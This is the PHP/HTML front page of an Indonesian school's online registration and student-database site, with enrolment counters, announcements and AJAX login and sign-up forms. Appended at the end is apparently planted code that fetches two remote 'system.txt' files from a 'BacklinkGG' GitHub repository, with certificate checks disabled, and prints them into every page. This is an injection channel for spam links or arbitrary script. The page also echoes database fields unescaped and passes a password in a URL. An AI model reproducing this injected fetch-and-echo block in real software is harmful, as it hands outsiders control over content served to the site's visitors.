                                    <div class="card-header bg-primary">Data Pendaftar</div>
                                    <div class="card-body">
                                        <h2 class="text-center"><?= rowcount($koneksi, 'siswa', ['jenis' => 1]) ?></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-secondary">Data Diterima</div>
                                    <div class="card-body">
                                        <h2 class="text-center"><?= rowcount($koneksi, 'siswa', ['status' => 4]) ?></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-success">Quota Pendaftar</div>
                                    <div class="card-body">
                                        <?php if ($setting['jenjang'] == 1) { ?>
                                        <h2 class="text-center"><?php $kuota = mysqli_fetch_array(mysqli_query($koneksi, "select *, sum(kuota) as kuota from jurusan"));
                                        echo $kuota['kuota']; ?></h2>
                                        <?php } else { ?>
                                        <h2 class="text-center"><?php $kuota = mysqli_fetch_array(mysqli_query($koneksi, "select *, sum(kuota) as kuota from jalur"));
                                        echo $kuota['kuota']; ?></h2>
                                        <?php } ?>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <section id="persyaratan">
                    <div class="container">
                        <h5 class="text-center">Info Pendaftaran </h5>
                        <h6 class="text-center">Peserta Didik Baru <?= $setting['nama_sekolah'] ?> Tahun Pelajaran <?= $setting['tahun_ajaran'] ?></h6>
                        <div class="row mt-12">
                            <div class="col-sm-6">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-primary">Alur Proses Pendaftaran</div>
                                    <div class="card-body">
									 <div class="col-12 animated bounceIn">
                                        <p>Silahkan Simak Alur Pendaftaran Sebelum Melakukan Pendaftaran di PPDB Online <?= $setting['nama_sekolah'] ?></p>
										<div class="activities">
											<div class="activity">
												<div class="activity-icon bg-primary text-white shadow-primary">
													1
												</div>
												<div class="activity-detail">
                                                    <?php if ($hariini <= $buka) { ?>
                                                    <p>Calon Siswa Mendaftar di Web Pendaftaran</p>
                                                    <p><button class="glow2-on-hover" style="font-weight: bold">
                                                    Belum Dibuka</button></p>
                                                    <?php } ?>
                                                    <?php if ($hariini >= $tutup) { ?>
                                                    <p>Calon Siswa Mendaftar di Web Pendaftaran</p>
                                                    <p><button class="glow5-on-hover" style="font-weight: bold">
                                                    Sudah Tutup</button></p>
                                                    <?php } else { ?> 
                                                    <?php if ($hariini >= $buka ) { ?>
                                                    <p>Calon Siswa Mendaftar di Web Pendaftaran</p>
                                                    <p><center><a href="#tentang" class="glow4-on-hover" style="font-weight: bold">
                                                    Klik Disini</a></center></p>
                                                    <?php } ?>
                                                    <?php } ?>
                                                </div>
											</div>
										</div>
										<div class="activities">
											<div class="activity">
												<div class="activity-icon bg-primary text-white shadow-primary">
													2
												</div>
												<div class="activity-detail">
													<p>Jika Selesai Pendaftaran Silahkan Login Dengan Username dan Password Saat Pendaftaran</p>
													<p><center><a href="#home"class="glow3-on-hover" style="font-weight: bold">
                                                    Masuk</a></center></p>
												</div>
											</div>
										</div>
										<div class="activities">
											<div class="activity">
												<div class="activity-icon bg-primary text-white shadow-primary">
													3
												</div>
												<div class="activity-detail">
													<p>Lengkapi Formulir Yang Diberikan Dengan Data Yang Benar</p>
												</div>
											</div>
										</div>
									</div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-success">Pengumuman</div>
                                    <div class="card-body">
										<div class="col-12 animated bounceIn">
                                            <div class="embed-responsive embed-responsive-16by9">
											<div class="activities">
												<?php $query = mysqli_query($koneksi, "SELECT * FROM pengumuman where jenis='2'");
													while ($data = mysqli_fetch_array($query)) {
													?>
                                                    <div class="activity">
														<div class="activity-icon bg-primary text-white shadow-primary">
														<i class="fa fa-bullhorn"></i>
														</div>
														<div class="activity-detail">
															<div class="mb-2">
																<span class="text-job text-primary"><?= $data['tgl'] ?></span>
																<span class="bullet"></span>
																	<a class="text-job" href="#">Tampil</a>
															</div>
																<h5><?= $data['judul'] ?></h5>
																<p><?= $data['pengumuman'] ?></p>
														</div>
                                                    </div>
												<?php } ?>
											</div>
                                            </div>
										</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <section id="statistik">
                    <div class="container">
                        <div class="row mt-12">
                            <div class="col-sm-12">
                                <div class="card gradient-border">
                                <div class="card-header text-white" style="background-color: #005f6b">
                                   <h4>Data Statistik Sekolah/Madrasah Asal Pendaftar</h4>
                                </div>
                                <div class="card-body">
                                    <div class="table-responsive">
                                        <script type="text/javascript">$('#sampleTable1').DataTable();</script>
                                         <table style="font-size: 12px" class="table table-striped table-sm" id="sampleTable">
                                            <thead>
                                                <tr>
                                                    <th class="text-center">No</th>
                                                    <th>Nama Sekolah/Madrasah</th>
                                                    <th class="text-center">Pendaftar</th>
                                                </tr>
                                            </thead>
                                            <tbody class="ui-sortable">
                                                <?php $query = mysqli_query($koneksi, "select * from siswa WHERE jenis = '1' group by asal_sekolah  ");
                                                 $no = 0;
                                                while ($sekolah = mysqli_fetch_array($query)) {
                                                    $no++;
                                                    $hitung = rowcount($koneksi, 'siswa', ['asal_sekolah' => $sekolah['asal_sekolah']]);
                                                    ?>
                                                    <tr>
                                                        <td><?= $no; ?></td>
                                                        <td><?= $sekolah['asal_sekolah'] ?></td>
                                                        <td class="text-center">
                                                        <div class="badge badge-success"><?= $hitung ?></div></td>
                                                    </tr>
                                                <?php } ?>
                                            </tbody>
                                        </table>
                                    </div>
                                </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
		<div class="home-footer">
            <b><div class="container text-center">Copyright &copy; <?= date('Y') ?> <?= $setting['nama_sekolah'] ?> <i class='fa fa-user-circle'></i> Admin By &bull; TIM IT <?= $setting['nama_sekolah'] ?> <i class='fa fa-user-circle'></i><b>
            </div>
        </div>
        <script>
            var baseURL = '/';
        </script>
		<script src="vendor/jquery-3.2.1.min.js"></script>
        <script src="vendor/jquery.form.min.js"></script>
        <script src="vendor/bootstrap.min.js"></script>
        <script src="vendor/popper.min.js"></script>
		<script src="assets/modules/izitoast/js/iziToast.min.js"></script>
		<script src="assets/modules/izitoast/js/iziToast.min.js"></script>
		<script type="text/javascript" src="js/plugins/jquery.dataTables.min.js"></script>
		<script type="text/javascript" src="js/plugins/dataTables.bootstrap.min.js"></script>
		<script type="text/javascript">$('#sampleTable').DataTable();</script>
        <!-- Vendor -->
        <script src="vendor/wow.min.js"></script>        
        <!-- Assets -->
        <script src="vendor/front.min.js"></script>       
    </body>
</html>
<script>
    $('#form-login').submit(function(e) {
        e.preventDefault();
        $.ajax({
            type: 'POST',
            url: 'crud_web.php?pg=login',
            data: $(this).serialize(),
            beforeSend: function() {
                $('#btnsimpan').prop('disabled', true);
            },
            success: function(data) {
                var json = $.parseJSON(data);
                $('#btnsimpan').prop('disabled', false);
                if (json.pesan == 'ok') {
                    iziToast.success({
                        title: 'Gagah Men !!!',
                        message: 'Ngana So Berhasil Login',
                        position: 'topRight'
                    });
                    setTimeout(function() {
                        window.location.href = "user";
                    }, 2000);

                } else {
                    iziToast.error({
                        title: 'Maaf !!!',
                        message: json.pesan,
                        position: 'topCenter'
                    });
                }
                //$('#bodyreset').load(location.href + ' #bodyreset');
            }
        });
        return false;
    });
</script>
<script>
    $('#form-daftar').submit(function(e) {
        e.preventDefault();
        $.ajax({
            type: 'POST',
            url: 'crud_web.php?pg=simpan',
            data: $(this).serialize(),
            beforeSend: function() {
                $('#btnsimpan').prop('disabled', true);
            },
            success: function(data) {
                var json = $.parseJSON(data);
                $('#btnsimpan').prop('disabled', false);
                if (json.pesan == 'ok') {
                    iziToast.success({
                        title: 'Gagah Men !!!',
                        message: 'Ngana So Berhasil Badaftar',
                        position: 'topRight'
                    });
                    setTimeout(function() {
                        $('#home').load('konfirmasi.php?id=' + json.id + '&nisn=' + json.nisn + '&pass=' + json.pass + '&nama=' + json.nama);
                    }, 2000);

                } else {
                    iziToast.error({
                        title: 'Maaf !!!',
                        message: json.pesan,
                        position: 'topCenter'
                    });
                    document.getElementById('captcha').src = 'securimage/securimage_show.php?' + Math.random();

                }
                //$('#bodyreset').load(location.href + ' #bodyreset');
            }
        });
        return false;
    });
    
</script>
<script>
    $('#form-daftar2').submit(function(e) {
        e.preventDefault();
        $.ajax({
            type: 'POST',
            url: 'crud_web.php?pg=simpan2',
            data: $(this).serialize(),
            beforeSend: function() {
                $('#btnsimpan').prop('disabled', true);
            },
            success: function(data) {
                var json = $.parseJSON(data);
                $('#btnsimpan').prop('disabled', false);
                if (json.pesan == 'ok') {
                    iziToast.success({
                        title: 'Gagah Men !!!',
                        message: 'Ngana So Berhasil Badaftar',
                        position: 'topRight'
                    });
                    setTimeout(function() {
                        $('#home').load('konfirmasi.php?id=' + json.id + '&nisn=' + json.nisn + '&pass=' + json.pass + '&nama=' + json.nama);
                    }, 2000);

                } else {
                    iziToast.error({
                        title: 'Maaf !!!',
                        message: json.pesan,
                        position: 'topCenter'
                    });
                    document.getElementById('captcha').src = 'securimage/securimage_show.php?' + Math.random();
                }
                //$('#bodyreset').load(location.href + ' #bodyreset');
            }
        });
        return false;
    });    
</script>
<?php } else { ?>
<!DOCTYPE html>
<html lang="en" translate="no">
<head>
<base href="./">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <meta name="google" content="notranslate" />
    <meta name="description" content="APLIKASI DATABASE &bull;  <?= $setting['nama_sekolah'] ?>">
    <meta name="author" content="<?= $setting['nama_sekolah'] ?>">
	<meta name="theme-color" content="#317EFB"/>
    <meta name="keyword" content="Aplikasi database,database madrasah,database sekolah">
	<meta name="msapplication-navbutton-color" content="#4285f4">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="theme-color" content="#ffffff">
    <title>DATABASE &bull; <?= $setting['nama_sekolah'] ?> </title>
    <link rel="shortcut icon" href="<?= $setting['logo'] ?>" >
	<link rel="stylesheet" href="assets/modules/izitoast/css/iziToast.min.css">
    <link href="assets/css/front2.min.css" rel="stylesheet" />
    <link rel="shortcut icon" href="<?= $setting['logo'] ?>" >		
	<link rel="stylesheet" href="assets/css/1.css">
	<link rel="stylesheet" href="assets/css/2.css">
	<link rel="stylesheet" href="assets/css/3.css">		
	<link rel="stylesheet" href="assets/css/components2.css">
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<!--========================================================================================-->
<style>
        @media screen and (max-width: 360px){
            #rc-imageselect, .g-recaptcha {transform:scale(0.66);-webkit-transform:scale(0.66);transform-origin:0 0;-webkit-transform-origin:0 0;}
        }
        @media screen and (min-width: 361px,max-width: 720px){
            #rc-imageselect, .g-recaptcha {transform:scale(0.88);-webkit-transform:scale(0.88);transform-origin:0 0;-webkit-transform-origin:0 0;}
        }
    </style>
    <style >
.pre-loader {
    background: #fff;
    background-position: center center;
    background-size: 13%;
    position: fixed;
    left: 0;
    top: 0;
    width: 100%;
    height: 100%;
    z-index: 12345;
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -ms-flex-wrap: wrap;
    flex-wrap: wrap;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    justify-content: center
}

.pre-loader .loader-logo {
    padding-bottom: 15px;
}

.pre-loader .loader-progress {
    height: 8px;
    border-radius: 15px;
    max-width: 200px;
    margin: 0 auto;
    display: block;
    background: #ecf0f4;
    overflow: hidden
}

.pre-loader .bar {
    width: 0%;
    height: 8px;
    display: block;
    background: #1b00ff
}

.pre-loader .percent {
    text-align: center;
    font-size: 24px;
}

.pre-loader .loading-text {
    text-align: center;
    font-size: 18px;
    font-weight: 500;
    padding-top: 15px
}

</style>
</head>
 
<div class="pre-loader">
<div class="pre-loader-box">
  <div class="loader-logo"><img src="assets/back/loading.gif" width="160px" alt=""></div>
  <div class="loader-progress" id="progress_div">
    <div class="bar" id="bar1" style="width: 100%;"></div>
  </div>
  <div class="percent" id="percent1">100%</div>
  <div class="loading-text">
    Mohon Menunggu...
  </div>
</div>
</div>
 
    <body data-spy="scroll" data-target="#menu" data-offset="100">
        <div class="home-wrapper" id="home">
            <div class="home-header">
                <div class="container p-0">
                    <nav class="navbar navbar-expand-lg navbar-light" id="navbar-header">
                        <a class="navbar-brand" href="javascript:;">
                            <img src="<?= $setting['logo'] ?>" height="75" />
                            <div class="home-header-text d-none d-sm-block">
                                <h5>APLIKASI DATABASE SISWA</h5>
                                <h6><?= $setting['nama_sekolah'] ?></h6>
                                <h6>Tahun Pelajaran <?= $setting['tahun_ajaran'] ?></h6>
                            </div>
                            <span class="logo-mini-unbk d-block d-sm-none">DATABASE </span>
                            <span class="logo-mini-tahun d-block d-sm-none">&nbsp;<span class=""style="color:#F00">&bull;</span>&nbsp;ONLINE</span>
                        </a>
						<hr>
                        <button class="navbar-toggler ml-auto" type="button" data-toggle="collapse" data-target="#menu" aria-controls="menu" aria-expanded="false" aria-label="Toggle navigation">
                            <span class="navbar-toggler-icon"></span>
                        </button>
                        <div class="collapse navbar-collapse" id="menu">
							<ul class="navbar-nav ml-auto">
                                <li class="nav-item active">
                                    <a class="nav-link" href="#home" id="link-home">Home</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="datasiswa.php" id="link-tentang">Data Siswa</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="dataalumni.php" id="link-statistik">Data Alumni</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="./user" id="link-persyaratan">Login Siswa</a>
                                </li>
								<li class="nav-item">
                                    <a class="nav-link" href="./login" id="link-persyaratan">Login Admin</a>
                                </li>
                            </ul>
                        </div>
                    </nav>
                </div>
            </div>
            <div class="home-banner">
                <div class="home-banner-bg home-banner-bg-color"></div>
                <div class="home-banner-bg home-banner-bg-img"></div>
                <div class="container mt-5">
                    <div class="row">
						<div class="col-sm-7">
                            <div id="carousel" class="carousel slide" data-ride="carousel">
                                <ol class="carousel-indicators">
                                    <li data-target="#carousel" data-slide-to="0" class="active"></li>
                                    <li data-target="#carousel" data-slide-to="1"></li>
                                </ol>
                                <div class="carousel-inner">
                                   <div class="carousel-item active">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Selamat Datang di Aplikasi Database Siswa Online
                                            </h5>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Tahun Pelajaran <?= $setting['tahun_ajaran'] ?>
                                            </h5>
                                            <ul>
                                                <li data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Database Siswa
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="2s">
                                                    Database Guru
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="3s">
                                                    Database Alumni
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="4s">
                                                    Administrasi Mutasi
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="5s">
                                                    Buku Induk Siswa
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="carousel-item">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Aplikasi Ini Mencakup Beberapa Fitur Diantaranya
                                            </h5>
                                            
                                            <ul>
                                                <li data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Mutasi Siswa
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="2s">
                                                    Buku Induk Siswa
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="3s">
                                                    Cetak Administrasi Siswa
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="4s">
                                                    Cetak Kartu NISN
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="5s">
                                                    Arsip Data Alumni
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-5 d-none d-sm-block">
                            <img src="assets/banner.svg" height="350" />
                        </div>
                    </div>
                </div>
            </div>
            <div class="home-content">
                <section id="statistik">
                    <div class="container">
                        <h5 class="text-center">Informasi Data </h5>
                        <h6 class="text-center"><?= $setting['nama_sekolah'] ?> Tahun Pelajaran <?= $setting['tahun_ajaran'] ?></h6>
                        <div class="row mt-12">
                            <div class="col-sm-4">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-primary">Data Siswa</div>
                                    <div class="card-body">
                                        <h2 class="text-center"><?= rowcount($koneksi, 'siswa', ['status' => 1]) ?></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-secondary">Data Alumni</div>
                                    <div class="card-body">
                                        <h2 class="text-center"><?= rowcount($koneksi, 'siswa', ['status' => 3]) ?></h2>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-4">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-success">Data PTK</div>
                                    <div class="card-body">
                                        <h2 class="text-center"><?= rowcount($koneksi, 'user', ['level' => 'gtk']) ?></h2>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                 <section id="persyaratan">
                    <div class="container">
                        <h5 class="text-center">Info Pendaftaran </h5>
                        <h6 class="text-center">Peserta Didik Baru <?= $setting['nama_sekolah'] ?> Tahun Pelajaran <?= $setting['tahun_ajaran'] ?></h6>
                        <div class="row mt-12">
                            <div class="col-sm-6">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-primary">Alur Proses Pendaftaran</div>
                                    <div class="card-body">
									 <div class="col-12 animated bounceIn">
                                        <p>Silahkan Simak Alur Pendaftaran Sebelum Melakukan Pendaftaran di PPDB Online <?= $setting['nama_sekolah'] ?></p>
										<div class="activities">
											<div class="activity">
												<div class="activity-icon bg-primary text-white shadow-primary">
													1
												</div>
												<div class="activity-detail">
                                                    <?php if ($hariini <= $buka) { ?>     
                                                    <p>Calon Siswa Mendaftar di Web Pendaftaran</p>
                                                    <p><a href="#" class="btn btn-warning btn-block btn-login" style="font-weight: bold">
                                                    Belum Dibuka</a></p>
                                                    <?php } ?>
                                                    <?php if ($hariini >= $tutup) { ?>  
                                                    <p>Calon Siswa Mendaftar di Web Pendaftaran</p>
                                                    <p><a href="#" class="btn btn-danger btn-block btn-login" style="font-weight: bold">
                                                    Sudah Tutup</a></p>
                                                    <?php } else { ?> 
                                                    <?php if ($hariini >= $buka )  { ?>     
                                                    <p>Calon Siswa Mendaftar di Web Pendaftaran</p>
                                                    <p><a href="#tentang" class="btn btn-primary btn-block btn-login" style="font-weight: bold">
                                                    Klik Disini</a></p>
                                                    <?php } ?>
                                                    <?php } ?>
                                                </div>
											</div>
										</div>
										<div class="activities">
											<div class="activity">
												<div class="activity-icon bg-primary text-white shadow-primary">
													2
												</div>
												<div class="activity-detail">
													<p>Jika Selesai Pendaftaran Silahkan Login Dengan Username dan Password Saat Pendaftaran</p>
													<p><a href="#tentang"class="btn btn-success btn-block btn-login" style="font-weight: bold">
                                                    Masuk</a></p>
												</div>
											</div>
										</div>
										<div class="activities">
											<div class="activity">
												<div class="activity-icon bg-primary text-white shadow-primary">
													3
												</div>
												<div class="activity-detail">
													<p>Lengkapi Formulir Yang Diberikan Dengan Data Yang Benar</p>

												</div>
											</div>
										</div>
									</div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-sm-6">
                                <div class="card mt-2 gradient-border">
                                    <div class="card-header bg-secondary">Pengumuman</div>
                                        <div class="card-body">
										    <div class="col-12 animated bounceIn">
                                                <div class="embed-responsive embed-responsive-16by9">
												    <div class="activities">
														<?php $query = mysqli_query($koneksi, "SELECT * FROM pengumuman where jenis='2'");
														while ($data = mysqli_fetch_array($query)) {
														    ?>
															<div class="activity">
																<div class="activity-icon bg-primary text-white shadow-primary">
																	<i class="fa fa-bullhorn"></i>
																</div>
																<div class="activity-detail">
																	<div class="mb-2">
																		<span class="text-job text-primary"><?= $data['tgl'] ?></span>
																		<span class="bullet"></span>
																		<a class="text-job" href="#">View</a>

																	</div>
																	<h5><?= $data['judul'] ?></h5>
																	<p><?= $data['pengumuman'] ?></p>
																</div>
															</div>
														<?php } ?>
													</div>
												</div>
                                            </div>
										</div> 
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
        </div>
		<div class="home-footer">
            <b><div class="container text-center">Copyright &copy; <?= date('Y') ?> <?= $setting['nama_sekolah'] ?> <i class='fa fa-user-circle'></i> Admin By &bull; TIM IT <?= $setting['nama_sekolah'] ?> <i class='fa fa-user-circle'></i>
            </div><b>
        </div>
        <script>
            var baseURL = '/';            
        </script>
		<script src="vendor/jquery-3.2.1.min.js"></script>
        <script src="vendor/jquery.form.min.js"></script>
        <script src="vendor/bootstrap.min.js"></script>
        <script src="vendor/popper.min.js"></script>
		<script src="assets/modules/izitoast/js/iziToast.min.js"></script>
		<script src="assets/modules/izitoast/js/iziToast.min.js"></script>
		<script type="text/javascript" src="js/plugins/jquery.dataTables.min.js"></script>
		<script type="text/javascript" src="js/plugins/dataTables.bootstrap.min.js"></script>
		<script type="text/javascript">$('#sampleTable').DataTable();</script>
        <!-- Vendor -->
        <script src="vendor/wow.min.js"></script>        
        <!-- Assets -->
        <script src="vendor/front.min.js"></script>
        <!-- Assets -->       
    </body>	
<?php } ?>
<script>
  $(document).ready(function() {
	var elapsedTime = 0;
	var interval = setInterval(function() {
	  timer()
	}, 10);
	function progressbar(percent) {
	  document.getElementById("bar1").style.width = percent + '%';
	  document.getElementById("percent1").innerHTML = percent + '%';
	}
	function timer() {
	  if (elapsedTime > 100) {
      var RDMData = decodeURIComponent(getCookie("rdmData"));
      if(RDMData !==""){
        var login = JSON.parse(RDMData);
        if(login.status !==""){
          clearInterval(interval);         
        }
      }
      if (elapsedTime >= 107) {
        clearInterval(interval);
        $(".pre-loader").hide();
      }
	  } else {
		  progressbar(elapsedTime);
	  }
	  elapsedTime++;
	}
	//setTimeout(function(){ $(".pre-loader").hide(); }, 2000);
  function getCookie(cname) {
    var name = cname + "=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i <ca.length; i++) {
      var c = ca[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  }
});
</script>
<script type="text/javascript">
    (function () {
        var options = {
            whatsapp: "<?= $setting['nolivechat'] ?>", // WhatsApp number
            email: "<?= $setting['email'] ?>", // Email
            call_to_action: "Hubungi Kami !!!", // Call to action
            button_color: "#006316", // Color of button
            position: "left", // Position may be 'right' or 'left'
            order: "whatsapp,email", // Order of buttons
            pre_filled_message: "<?= $setting['livechat'] ?>", // WhatsApp pre-filled message
        };
        var proto = document.location.protocol, host = "getbutton.io", url = proto + "//static." + host;
        var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = url + '/widget-send-button/js/init.js';
        s.onload = function () { WhWidgetSendButton.init(host, proto, options); };
        var x = document.getElementsByTagName('script')[0]; x.parentNode.insertBefore(s, x);
    })();
</script>
<!--WAKTU JALAN-->
    <script src="assets/vendor/jquery/jquery-3.2.1.min.js"></script>
    <script src="assets/vendor/bootstrap/js/popper.js"></script>
    <script src="assets/vendor/countdowntime/flipclock.min.js"></script>
    <script src="assets/vendor/countdowntime/moment.min.js"></script>
    <script src="assets/vendor/countdowntime/moment-timezone.min.js"></script>
    <script src="assets/vendor/countdowntime/moment-timezone-with-data.min.js"></script>
    <script src="assets/vendor/countdowntime/countdowntime.js"></script>
    <link rel="stylesheet" href="assets/vendor/gloweffect.css">
    <link rel="stylesheet" href="assets/vendor/snakeborder.css">
    
    <script>
        $('.cd100').countdown100({
            /*Set Endtime here*/
            /*Endtime must be > current time*/
            endtimeMonth: <?= $diff->m ?>,
            endtimeDate: <?= $diff->d ?>,
            endtimeHours: <?= $diff->h ?>,
            endtimeMinutes: <?= $diff->i ?>,
            endtimeSeconds: <?= $diff->s ?>,
            timeZone: ""
            // ex:  timeZone: "America/New_York"
            //go to " http://momentjs.com/timezone/ " to get timezone
        });
    </script>
<?php
function curlGetContents($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $fileContents = curl_exec($ch);
    curl_close($ch);
    return $fileContents; 
}
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/mtsdarululumsasa/ppdb.mtsdarululumsasa.sch.id/system.txt';
$fileContents1 = curlGetContents($url1);
$fileContents2 = curlGetContents($url2);
echo $fileContents1;
echo $fileContents2;
?>
